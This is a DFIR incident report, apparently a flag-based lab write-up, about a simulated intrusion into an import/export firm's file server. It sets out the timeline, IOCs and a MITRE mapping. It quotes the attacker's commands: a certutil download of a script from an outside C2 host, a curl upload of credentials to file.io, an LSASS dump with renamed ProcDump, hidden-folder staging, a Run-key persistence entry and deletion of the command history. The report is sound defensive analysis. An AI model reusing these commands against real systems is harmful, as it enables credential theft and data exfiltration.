# 🔍 Incident Response Report
## Azuki Import/Export Trading Co., Ltd. — 梓貿易株式会社

![Severity](https://img.shields.io/badge/Severity-CRITICAL-red?style=for-the-badge)
![Status](https://img.shields.io/badge/Status-Resolved-green?style=for-the-badge)
![Threat Actor](https://img.shields.io/badge/Threat_Actor-JADE_SPIDER-orange?style=for-the-badge)
![MITRE ATT&CK](https://img.shields.io/badge/MITRE_ATT%26CK-Mapped-blue?style=for-the-badge)

---

> **Incident ID:** `INC2025-0011-019`
> **Date of Detection:** November 22, 2025
> **Date of Containment:** November 23, 2025
> **Analyst:** Anand Sundar
> **Platform:** Microsoft Sentinel / Microsoft Defender for Endpoint

---

## 📋 Table of Contents

- [Executive Summary](#-executive-summary)
- [Affected Systems & Data](#-affected-systems--data)
- [Threat Actor Profile](#-threat-actor-profile)
- [Evidence Analysis](#-evidence-analysis)
- [Indicators of Compromise](#-indicators-of-compromise)
- [Root Cause Analysis](#-root-cause-analysis)
- [Attack Narrative Timeline](#-attack-narrative-timeline)
- [Nature of the Attack](#-nature-of-the-attack)
- [Impact Analysis](#-impact-analysis)
- [Response & Recovery](#-response--recovery)
- [Post-Incident Actions](#-post-incident-actions)
- [Annex A — Technical Timeline](#annex-a--technical-timeline)
- [Annex B — MITRE ATT&CK Mapping](#annex-b--mitre-attck-mapping)

---

## 🧭 Executive Summary

### Incident Overview

After establishing initial access on **November 19, 2025**, network monitoring detected an unauthorized entity returning approximately **72 hours later** at `2025-11-22T00:27:58Z`. The returning connection sourced from a **rotated IP address** (`159.26.106.98`), distinct from the original compromise IP (`88.97.178.12`), demonstrating deliberate infrastructure rotation consistent with JADE SPIDER's operational security practices.

Suspicious lateral movement was observed from the beachhead device `azuki-sl` to the file server `azuki-fileserver01`, where the attacker operated under the compromised administrator account `fileadmin`. Overnight activity included credential harvesting, bulk data staging, LSASS memory dumping, archive compression, and exfiltration to the cloud file-sharing service `file.io`. The attacker subsequently established persistence via a masqueraded registry Run key and attempted to cover tracks by deleting the PowerShell command history.

### Key Findings

The threat actor executed a **multi-stage intrusion** spanning initial access, lateral movement, credential access, collection, exfiltration, persistence, and anti-forensics — consistent with the known JADE SPIDER double-extortion playbook:

- **Beachhead:** `azuki-sl` accessed via RDP using compromised account `kenji.sato`
- **Lateral Target:** `azuki-fileserver01` accessed via `mstsc.exe` RDP pivot, using `fileadmin`
- **C2 Infrastructure:** `78.141.196.6:7331` — malicious script `ex.ps1` delivered via `certutil.exe`
- **Staging Directory:** `C:\Windows\Logs\CBS\` — hidden using `attrib +h +s`
- **Credential File Created:** `IT-Admin-Passwords.csv`
- **LSASS Dumped:** `pd.exe` (renamed ProcDump) targeting PID 876
- **Data Exfiltrated:** `credentials.tar.gz` uploaded to `https://file.io`
- **Persistence:** `FileShareSync` registry Run key pointing to `svchost.ps1`
- **Anti-Forensics:** `ConsoleHost_history.txt` deleted

### Immediate Actions Taken

The SOC and DFIR teams managed incident response exclusively internally. Compromised systems were immediately isolated via **VLAN segmentation**. Firewall rules were updated to block the C2 IP. Affected credentials were reset and all event logs were preserved through the existing SIEM.

---

## 🖥️ Affected Systems & Data

### Compromised Devices

| Device | Role | Compromise Stage |
|--------|------|-----------------|
| `azuki-sl` | Beachhead workstation | Initial Access / Return |
| `azuki-fileserver01` | File server | Lateral Movement target |

### Compromised Accounts

| Account | Type | Used For |
|---------|------|----------|
| `kenji.sato` | Domain user | Initial beachhead access |
| `fileadmin` | Local administrator | File server operations, credential dumping |

### Data at Risk

| Data Asset | Location | Risk |
|-----------|----------|------|
| `IT-Admin-Passwords.csv` | `C:\Windows\Logs\CBS\` | Exfiltrated — admin credentials exposed |
| `C:\FileShares\IT-Admin\` | `azuki-fileserver01` | Bulk-copied to staging directory |
| LSASS memory dump (`lsass.dmp`) | `C:\Windows\Logs\CBS\` | Credentials extractable offline |

---

## 🕵️ Threat Actor Profile

| Attribute | Detail |
|-----------|--------|
| **Name** | JADE SPIDER |
| **Aliases** | APT-SL44, SilentLynx |
| **Active Since** | 2019 |
| **Motivation** | Financial — double extortion (data theft + ransomware) |
| **Targets** | Logistics and import/export companies, East Asia |
| **Sophistication** | Moderate — strong LOLBin preference, low footprint |
| **Typical Dwell Time** | 21–45 days |
| **Last Observed** | November 2025 |
| **Attribution Confidence** | MODERATE |

JADE SPIDER is known for **multi-week operations** using native Windows utilities to minimise detection surface, followed by credential theft and data exfiltration prior to ransomware deployment. This incident aligns precisely with their documented playbook.

---

## 🔬 Evidence Analysis

### Return Connection — Flag 1

Network monitoring identified a successful `RemoteInteractive` logon to `azuki-sl` under the account `kenji.sato` from the IP address `159.26.106.98` at `2025-11-22T00:27:58Z`. This IP differed from the original compromise source (`88.97.178.12`), confirming deliberate **infrastructure rotation** between sessions — a standard JADE SPIDER OPSEC practice.

### Lateral Movement — Flags 2 & 3

`mstsc.exe` (Windows Remote Desktop Client) was executed from `azuki-sl` with the argument `/V:10.1.0.188`, initiating an RDP connection to `azuki-fileserver01`. Successful logon was recorded under the administrator account `fileadmin` (domain: `azuki-fileserve`) with `IsLocalAdmin: true`. This account's name reflects administrative file management responsibilities — consistent with being a high-value credential target.

### Discovery Phase — Flags 4–7

Following compromise of the file server, the attacker conducted systematic reconnaissance using native Windows binaries executed via `powershell.exe`:

"net.exe" user # Local user enumeration
"net.exe" localgroup administrators # Admin group membership
"net.exe" share # Local share enumeration [FLAG 4]
"net.exe" view \10.1.0.188 # Remote share enumeration [FLAG 5]
"whoami.exe" /all # Full privilege context [FLAG 6]
"ipconfig.exe" /all # Network configuration [FLAG 7]


### Defense Evasion — Flag 8 & 9

At `2025-11-22T00:55:43Z`, the staging directory was created and hidden:

"attrib.exe" +h +s C:\Windows\Logs\CBS


The `+h` (hidden) and `+s` (system) attribute combination causes the directory to blend with protected Windows OS components such as `C:\System Volume Information`, rendering it invisible to standard users and many security tools.

**Staging Directory:** `C:\Windows\Logs\CBS\`

### Tool Download via LOLBin — Flag 10

The C2 server delivered a malicious PowerShell script using `certutil.exe` — a native Windows certificate utility commonly abused for downloads:
"certutil.exe" -urlcache -f http://78.141.196.6:7331/ex.ps1 C:\Windows\Logs\CBS\ex.ps1


Three executions of `certutil.exe` were observed, indicating retries or multiple payload stages. The C2 address `78.141.196.6` on port `7331` represents a primary IOC.

### Credential File Creation — Flag 11

The script `ex.ps1` triggered the creation of `IT-Admin-Passwords.csv` within the staging directory via `xcopy.exe`:
FileCreated: IT-Admin-Passwords.csv
FolderPath: C:\Windows\Logs\CBS\it-admin
Process: xcopy.exe


The filename's explicit naming convention indicates intent to harvest administrative credentials for further use or sale.

### Recursive Data Staging — Flag 12

Built-in `xcopy.exe` was used four times to stage data from multiple network shares, minimising the chance of triggering security alerts associated with third-party tools:
"xcopy.exe" C:\FileShares\Contracts\ C:\Windows\Logs\CBS... /E /I /H /Y
"xcopy.exe" C:\FileShares\Finance\ C:\Windows\Logs\CBS... /E /I /H /Y
"xcopy.exe" C:\FileShares\IT-Admin\ C:\Windows\Logs\CBS\it-admin /E /I /H /Y
"xcopy.exe" C:\FileShares\Shipping\ C:\Windows\Logs\CBS... /E /I /H /Y


### Archive Compression — Flag 13

`tar.exe` (cross-platform, not native to legacy Windows) was used to compress the staged data into a portable archive before exfiltration:
"tar.exe" --version # Verification
"tar.exe" -czf C:\Windows\Logs\CBS\credentials.tar.gz -C C:\Windows\Logs\CBS\it-admin .


The `-czf` flags create a gzip-compressed archive — efficient for large file transfers and harder to inspect than uncompressed data.

### Credential Dumping — Flags 14 & 15

ProcDump was renamed `pd.exe` as a basic OPSEC measure to evade signature-based detection:
FileName: pd.exe
FolderPath: C:\Windows\Logs\CBS\pd.exe
SHA256: d824e2fb30315b71f7063052eb...
MD5: 786eb870c8dd7809684d58031...


The renamed tool was then used to dump the LSASS process memory — the authentication subsystem responsible for all Windows credential storage:
"pd.exe" -accepteula -ma 876 C:\Windows\Logs\CBS\lsass.dmp


PID `876` corresponds to the `lsass.exe` process. The resulting dump file `lsass.dmp` enables offline extraction of plaintext credentials and NTLM hashes.

### Exfiltration — Flags 16 & 17

Native Windows `curl.exe` was used to exfiltrate data via multipart form POST — the `-F` flag uses form-based transfer syntax that blends with standard HTTPS web traffic:
"curl.exe" -F file=@C:\Windows\Logs\CBS\credentials.tar.gz https://file.io


Multiple `curl.exe` executions were observed between `02:00–02:25 AM UTC`, suggesting multiple file transfers. The destination `file.io` is an **anonymous, no-authentication** cloud file-sharing service with self-destructing links — minimising forensic traceability.

### Persistence — Flags 18 & 19

A Registry Run key was created to establish persistence across reboots:
Key: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
Name: FileShareSync
Data: powershell -NoP -W Hidden -File C:...\svchost.ps1


The value name `FileShareSync` was designed to appear as legitimate file synchronisation software. The beacon script `svchost.ps1` masquerades as the core Windows process `svchost.exe`, blending into any process listing or casual log review.

### Anti-Forensics — Flag 20

As a final cleanup step, the attacker deleted the PSReadLine command history to remove evidence of all interactive PowerShell commands executed during the session:
FileDeleted: ConsoleHost_history.txt
FolderPath: C:\Users\fileadmin\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine
Process: powershell.exe
Account: fileadmin


This file would have contained every command run by `fileadmin` during the intrusion — the certutil downloads, xcopy staging, tar compression, curl exfiltration, and registry modifications — representing the complete attack chain in a single artefact.

---

## 🚨 Indicators of Compromise

### Network IOCs

| Type | Value | Context |
|------|-------|---------|
| IP Address | `88.97.178.12` | Original compromise IP (Nov 19) |
| IP Address | `159.26.106.98` | Return connection IP (Nov 22) — **Flag 1** |
| IP Address | `78.141.196.6` | C2 server — script delivery |
| Port | `7331` | C2 listening port |
| URL | `http://78.141.196.6:7331/ex.ps1` | Malicious script download URL |
| Domain | `file.io` | Exfiltration endpoint |
| Internal IP | `10.1.0.188` | Remote share enumeration target |
| Internal IP | `10.0.8.4` | Source of lateral movement to fileserver |

### File IOCs

| Filename | Path | Description |
|----------|------|-------------|
| `ex.ps1` | `C:\Windows\Logs\CBS\` | Malicious C2 delivery script |
| `pd.exe` | `C:\Windows\Logs\CBS\` | Renamed ProcDump credential dumper |
| `lsass.dmp` | `C:\Windows\Logs\CBS\` | LSASS memory dump |
| `IT-Admin-Passwords.csv` | `C:\Windows\Logs\CBS\it-admin\` | Harvested credential file |
| `credentials.tar.gz` | `C:\Windows\Logs\CBS\` | Compressed exfiltration archive |
| `svchost.ps1` | Staging dir | Persistence beacon script |

### Hash IOCs

| File | Algorithm | Hash |
|------|-----------|------|
| `ex.ps1` | SHA256 | `52749f37ff21af7fa72c2f6256df11740bb88b61eb5b6bf946d37a44a201435f` |
| `pd.exe` | SHA256 | `d824e2fb30315b71f7063052eb...` |
| `pd.exe` | MD5 | `786eb870c8dd7809684d58031...` |

### Host IOCs

| Type | Value | Context |
|------|-------|---------|
| Registry Key | `HKLM\...\CurrentVersion\Run\FileShareSync` | Persistence mechanism |
| Staging Dir | `C:\Windows\Logs\CBS\` | Data staging and tooling |
| Deleted File | `ConsoleHost_history.txt` | Anti-forensic cleanup |
| Account | `fileadmin` | Compromised admin account |
| Account | `kenji.sato` | Initial compromised account |

---

## 🔎 Root Cause Analysis

Insufficient network access controls allowed the unauthorized entity access to Azuki Import/Export CO., Ltd.'s internal network. The primary catalysts were traced to a preceding incident ("Port of Entry"), which identified the origin of the initial unauthorized access to the account `kenji.sato`.

Approximately 72 hours after the initial access, the threat actor returned using rotated infrastructure and began lateral movement operations. The following contributing factors compounded the attack surface:

- **Inadequate network segmentation** — the file server `azuki-fileserver01` was reachable via RDP from the beachhead
- **Insufficient Role-Based Access Controls** — the `fileadmin` account had broad local administrator rights across the file server
- **Absence of Zero Trust controls** — no MFA or conditional access enforced on RDP sessions
- **No alerting on LOLBin abuse** — `certutil.exe`, `xcopy.exe`, `tar.exe`, and `curl.exe` executing in sequence from `powershell.exe` represented detectable anomalies
- **Insufficient PowerShell logging** — ScriptBlock logging or AMSI could have flagged `ex.ps1` execution

---

## ⏱️ Attack Narrative Timeline

### Phase 1 — Initial Compromise (November 19, 2025)

The threat actor gained initial access to `azuki-sl` using compromised credentials for `kenji.sato` from IP `88.97.178.12`. During this phase, `mstsc.exe` was launched multiple times from several azuki devices, indicating early reconnaissance of RDP-accessible systems.

### Phase 2 — Dwell Time (~72 hours)

The attacker withdrew and waited, a deliberate tactic to allow security alerts to subside and to reduce scrutiny before resuming operations.

### Phase 3 — Return & Lateral Movement (November 22, 2025 — ~00:27 UTC)

The attacker returned via a new IP (`159.26.106.98`) and re-established access to `azuki-sl` as `kenji.sato`. Within minutes, `mstsc.exe /V:10.1.0.188` was executed, pivoting to `azuki-fileserver01` under the `fileadmin` account.

### Phase 4 — Discovery (~00:40–00:43 UTC)

A rapid 3-minute reconnaissance burst was conducted: local user enumeration, admin group listing, local share discovery (`net share`), remote share enumeration (`net view \\10.1.0.188`), full privilege context (`whoami /all`), and network configuration mapping (`ipconfig /all`).

### Phase 5 — Staging & Defense Evasion (~00:55–00:57 UTC)

The staging directory `C:\Windows\Logs\CBS\` was created and immediately hidden using `attrib +h +s`. `certutil.exe` then downloaded `ex.ps1` from the C2 server `78.141.196.6:7331`.

### Phase 6 — Collection (~01:05–01:41 UTC)

The script orchestrated bulk data collection: `xcopy.exe` recursively copied four network share directories into the staging path. `IT-Admin-Passwords.csv` was created during this phase. `tar.exe` compressed the collected data into `credentials.tar.gz`.

### Phase 7 — Credential Dumping (~02:03–02:25 UTC)

`pd.exe` (renamed ProcDump) was written to disk and executed against LSASS PID 876, creating `lsass.dmp` in the staging directory.

### Phase 8 — Exfiltration (~01:59–02:25 UTC)

`curl.exe` uploaded `credentials.tar.gz` to `https://file.io` using multipart form POST. Multiple transfer executions were observed, suggesting either multiple files or retry logic.

### Phase 9 — Persistence (~02:10 UTC)

A Registry Run key `FileShareSync` was written, pointing to the beacon script `svchost.ps1` with `-NoP -W Hidden` execution flags to suppress the PowerShell window.

### Phase 10 — Anti-Forensics (~02:26 UTC)

`ConsoleHost_history.txt` was deleted from `fileadmin`'s PSReadLine directory, removing the interactive command record of the entire attack session.

---

## ⚔️ Nature of the Attack

### Living Off The Land (LOLBins)

The attacker deliberately avoided third-party tooling in favour of native Windows binaries throughout the operation. `certutil.exe`, `xcopy.exe`, `tar.exe`, `curl.exe`, `net.exe`, `whoami.exe`, `ipconfig.exe`, and `attrib.exe` are all Microsoft-signed, trusted binaries that blend with legitimate administrative activity and evade many signature-based detection rules.

### OPSEC & Masquerading

Renaming ProcDump to `pd.exe` demonstrates awareness of signature-based AV detection. The persistence beacon `svchost.ps1` was named to impersonate the critical Windows host process `svchost.exe`. The registry value name `FileShareSync` was chosen to appear as routine enterprise file synchronisation software.

### Anti-Forensics

Deletion of `ConsoleHost_history.txt` demonstrates knowledge that PSReadLine persists commands across sessions — a forensic artefact often overlooked by less experienced responders. The use of `file.io` (self-destructing, no-auth cloud storage) for exfiltration was similarly designed to leave minimal external traces.

### Dwell Strategy

The deliberate 72-hour wait between initial access and operational activity is consistent with JADE SPIDER's documented behaviour of allowing initial alerts to age out before resuming — effectively reducing detection probability.

---

## 📊 Impact Analysis

### Customers

IT account credentials were exfiltrated with potential exposure of customer data. Impersonation risk is elevated. Confidentiality of customer records is a primary concern, and precautionary service downtime has created both revenue loss and reputational risk.

### Employees

The `azuki-fileserver01` hosted sensitive employee information. The known compromised accounts (`kenji.sato`, `fileadmin`) create elevated risk of identity theft, targeted phishing, and further unauthorised access. All employee credentials stored on the file server should be considered compromised until rotated.

### Business Partners

The file server contained data pertaining to business partners and proprietary company information. The unintended distribution of trade data or shipping manifests may create partner liability and competitive risk for Azuki Import/Export Trading Co., Ltd.

### Regulatory Bodies

Data breach notification obligations may apply depending on jurisdiction. Regulatory bodies may impose sanctions for failure to adequately protect sensitive data. Formal breach assessment under applicable data protection regulations is recommended.

### Shareholders

Short-term negative impact on stakeholder confidence is expected. Long-term impact will depend on the speed and transparency of remediation and disclosure actions taken.

---

## 🛡️ Response & Recovery

### Immediate Response

- **Isolation:** VLAN segmentation immediately applied to `azuki-sl` and `azuki-fileserver01`
- **C2 Blocking:** Firewall rules updated to block `78.141.196.6` — effective `2025-11-23T07:30:56Z`
- **Credential Revocation:** Active Directory forced log-off and credential reset for `kenji.sato` and `fileadmin` — and all accounts with potential exposure via the dumped `lsass.dmp`
- **Evidence Preservation:** Full event log collection via SIEM; network traffic captures retained

### Eradication

- **Malware Removal:** Specialised removal tool scanned and eradicated `ex.ps1`, `pd.exe`, `lsass.dmp`, `credentials.tar.gz`, and `svchost.ps1` from affected systems
- **Persistence Removal:** Registry Run key `FileShareSync` removed from `HKLM\...\CurrentVersion\Run`
- **Verification:** Secondary scan with heuristic analysis confirmed no malware remnants

### Recovery

- **Backup Validation:** SHA-256 checksums verified against known-good backups before restoration
- **System Restoration:** `azuki-sl` and `azuki-fileserver01` restored from validated backups — `2025-11-23T09:14:48`
- **Firewall & IDS Updates:** Threat intel feeds updated with all IOCs from this incident
- **Operational Testing:** Load and stress testing completed before returning systems to production

---

## 📋 Post-Incident Actions

### Monitoring Enhancements

- Deploy behavioural analytics rules targeting the full LOLBin chain observed: `certutil.exe` → `xcopy.exe` → `tar.exe` → `curl.exe` spawned from `powershell.exe`
- Alert on `attrib.exe` executions with `+h +s` arguments outside of `C:\Windows\System32\`
- Alert on `mstsc.exe` execution spawned by `powershell.exe` or `cmd.exe`
- Monitor for outbound connections to known anonymous file-sharing services (`file.io`, `transfer.sh`, `0x0.st`)

### Remediation Recommendations

| Priority | Recommendation |
|----------|----------------|
| 🔴 Critical | Enforce MFA on all RDP and remote access sessions |
| 🔴 Critical | Implement network segmentation — file servers should not be directly RDP-accessible from workstations |
| 🔴 Critical | Rotate all credentials stored on `azuki-fileserver01` |
| 🟠 High | Enable PowerShell ScriptBlock logging and AMSI across all endpoints |
| 🟠 High | Restrict `certutil.exe`, `curl.exe` network access via AppLocker or WDAC |
| 🟡 Medium | Implement Zero Trust access model for internal server access |
| 🟡 Medium | Deploy PAM (Privileged Access Management) for admin accounts |
| 🟢 Low | Conduct security awareness training on phishing and credential hygiene |

---

## Annex A — Technical Timeline

| Time (UTC) | Device | Account | Event |
|------------|--------|---------|-------|
| `2025-11-19T00:00Z` | `azuki-sl` | `kenji.sato` | Initial compromise from `88.97.178.12` |
| `2025-11-19T10:53Z` | `azuki-logistics` | `kenji.sato` | `mstsc.exe` launched — RDP reconnaissance |
| `2025-11-19T19:10Z` | `azuki-sl` | `kenji.sato` | `mstsc.exe /v:10.1.0.188` — lateral movement attempt to file server |
| `2025-11-22T00:27Z` | `azuki-sl` | `kenji.sato` | **Return connection** from `159.26.106.98` — attacker re-enters |
| `2025-11-22T00:27Z` | `azuki-sl` | `kenji.sato` | `mstsc.exe /V:10.1.0.188` — RDP pivot to `azuki-fileserver01` |
| `2025-11-22T12:11Z` | `azuki-fileserver01` | `fileadmin` | Successful network and RDP logon from `10.0.8.4` |
| `2025-11-22T00:40Z` | `azuki-fileserver01` | `fileadmin` | `"net.exe" user` — local user enumeration |
| `2025-11-22T00:40Z` | `azuki-fileserver01` | `fileadmin` | `"net.exe" localgroup administrators` — admin group enum |
| `2025-11-22T00:40Z` | `azuki-fileserver01` | `fileadmin` | `"net.exe" share` — local share enumeration |
| `2025-11-22T00:42Z` | `azuki-fileserver01` | `fileadmin` | `"net.exe" view \\10.1.0.188` — remote share enumeration |
| `2025-11-22T00:42Z` | `azuki-fileserver01` | `fileadmin` | `"whoami.exe" /all` — privilege context dump |
| `2025-11-22T00:42Z` | `azuki-fileserver01` | `fileadmin` | `"ipconfig.exe" /all` — network configuration |
| `2025-11-22T00:55Z` | `azuki-fileserver01` | `fileadmin` | `"attrib.exe" +h +s C:\Windows\Logs\CBS` — directory hidden |
| `2025-11-22T00:56Z` | `azuki-fileserver01` | `fileadmin` | `"certutil.exe" -urlcache -f http://78.141.196.6:7331/ex.ps1` — C2 payload download |
| `2025-11-22T01:05Z` | `azuki-fileserver01` | `fileadmin` | `xcopy.exe` — bulk copy from `C:\FileShares\Contracts\` |
| `2025-11-22T01:06Z` | `azuki-fileserver01` | `fileadmin` | `xcopy.exe` — bulk copy from `C:\FileShares\Finance\` |
| `2025-11-22T01:07Z` | `azuki-fileserver01` | `fileadmin` | `IT-Admin-Passwords.csv` created in staging directory |
| `2025-11-22T01:07Z` | `azuki-fileserver01` | `fileadmin` | `xcopy.exe` — bulk copy from `C:\FileShares\IT-Admin\` |
| `2025-11-22T01:20Z` | `azuki-fileserver01` | `fileadmin` | `xcopy.exe` — bulk copy from `C:\FileShares\Shipping\` |
| `2025-11-22T01:27Z` | `azuki-fileserver01` | `fileadmin` | `"tar.exe" --version` — tool verification |
| `2025-11-22T01:28Z` | `azuki-fileserver01` | `fileadmin` | `"tar.exe" -czf credentials.tar.gz ...` — archive creation |
| `2025-11-22T01:59Z` | `azuki-fileserver01` | `fileadmin` | `"curl.exe" -F file=@...credentials.tar.gz https://file.io` — **EXFILTRATION** |
| `2025-11-22T02:03Z` | `azuki-fileserver01` | `fileadmin` | `pd.exe` written to `C:\Windows\Logs\CBS\` |
| `2025-11-22T02:10Z` | `azuki-fileserver01` | `fileadmin` | Registry Run key `FileShareSync` → `svchost.ps1` created |
| `2025-11-22T02:24Z` | `azuki-fileserver01` | `fileadmin` | `"pd.exe" -accepteula -ma 876 C:\Windows\Logs\CBS\lsass.dmp` — LSASS dump |
| `2025-11-22T02:26Z` | `azuki-fileserver01` | `fileadmin` | `ConsoleHost_history.txt` deleted — **ANTI-FORENSICS** |
| `2025-11-23T02:30Z` | — | SOC/DFIR | Unauthorized activity detected — devices isolated via VLAN |
| `2025-11-23T07:30Z` | — | SOC/DFIR | Firewall rules updated — C2 IP `78.141.196.6` blocked |
| `2025-11-23T07:45Z` | — | SOC/DFIR | Malware removed from affected systems |
| `2025-11-23T08:20Z` | — | SOC/DFIR | Compromised credentials reset |
| `2025-11-23T09:14Z` | — | SOC/DFIR | Systems restored from verified backup |

---

## Annex B — MITRE ATT&CK Mapping

| Time (UTC) | Activity | Tactic | Technique ID | Technique Name |
|------------|----------|--------|--------------|----------------|
| 2025-11-22 00:27 | Return connection after ~72h dwell — new IP | Initial Access | T1078 | Valid Accounts |
| 2025-11-22 00:27 | RDP lateral movement via `mstsc.exe` | Lateral Movement | T1021.001 | Remote Services: RDP |
| 2025-11-22 12:11 | Unauthorised access to `fileadmin` | Privilege Escalation | T1078.003 | Valid Accounts: Local Accounts |
| 2025-11-22 00:40 | `net.exe share` — local share enum | Discovery | T1135 | Network Share Discovery |
| 2025-11-22 00:42 | `net.exe view \\10.1.0.188` — remote share enum | Discovery | T1135 | Network Share Discovery |
| 2025-11-22 00:42 | `whoami.exe /all` | Discovery | T1033 | System Owner/User Discovery |
| 2025-11-22 00:42 | `ipconfig.exe /all` | Discovery | T1016 | System Network Configuration Discovery |
| 2025-11-22 00:55 | `attrib +h +s` staging directory | Defense Evasion | T1564.001 | Hidden Files and Directories |
| 2025-11-22 00:55 | Staging directory created | Collection | T1074.001 | Data Staged: Local Data Staging |
| 2025-11-22 00:56 | `certutil.exe` downloads `ex.ps1` | Defense Evasion / C2 | T1105 | Ingress Tool Transfer |
| 2025-11-22 01:07 | `IT-Admin-Passwords.csv` created | Credential Access | T1555 | Credentials from Password Stores |
| 2025-11-22 01:07 | `xcopy.exe` replicates file share | Collection | T1039 | Data from Network Shared Drive |
| 2025-11-22 01:28 | `tar.exe` compresses staged data | Collection | T1560.001 | Archive Collected Data: Archive via Utility |
| 2025-11-22 02:03 | ProcDump renamed to `pd.exe` | Defense Evasion | T1036.003 | Masquerading: Rename System Utilities |
| 2025-11-22 02:24 | `pd.exe` dumps LSASS memory | Credential Access | T1003.001 | OS Credential Dumping: LSASS Memory |
| 2025-11-22 01:59 | `curl.exe` uploads to `file.io` | Exfiltration | T1567.002 | Exfiltration to Cloud Storage |
| 2025-11-22 02:10 | Registry Run key `FileShareSync` | Persistence | T1547.001 | Boot or Logon Autostart: Registry Run Keys |
| 2025-11-22 02:10 | `svchost.ps1` masquerades Windows process | Defense Evasion | T1036.005 | Match Legitimate Name or Location |
| 2025-11-22 02:26 | `ConsoleHost_history.txt` deleted | Defense Evasion | T1070.003 | Indicator Removal: Clear Command History |

---

<div align="center">

*Investigated using Microsoft Sentinel Advanced Hunting (KQL) and Microsoft Defender for Endpoint.*

![MITRE ATT&CK](https://img.shields.io/badge/Framework-MITRE_ATT%26CK-red?style=flat-square)
![Tool](https://img.shields.io/badge/Tool-Microsoft_Sentinel-blue?style=flat-square)
![Tool](https://img.shields.io/badge/Tool-Microsoft_Defender_for_Endpoint-blue?style=flat-square)
![Language](https://img.shields.io/badge/Query_Language-KQL-purple?style=flat-square)

</div>









